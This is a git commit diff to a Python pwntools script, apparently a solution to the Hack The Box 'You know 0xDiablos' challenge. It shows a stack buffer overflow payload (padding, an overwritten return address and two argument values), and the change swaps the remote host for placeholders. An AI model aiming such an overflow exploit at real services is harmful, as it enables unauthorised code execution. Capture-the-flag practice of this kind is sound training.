6949c626f599c06112f788cce0b067b6b57d2ff4
D4rkArmy <50493161+Dark4rmy@users.noreply.github.com>
2020-04-17 00:49:51 +0000

    Update You_know_0xDiablos.py

--- You_know_0xDiablos.py
+++ You_know_0xDiablos.py
@@ -4,7 +4,7 @@ context.log_level = 'critical'
 
 junk = "A"*188 + p32(0x080491e2) + p32(0x00)  + p32(0xdeadbeef) + p32(0xc0ded00d)
 
-s = remote('docker.hackthebox.eu',30698)
+s = remote('ip here',port here)
 
 print s.recv()
 
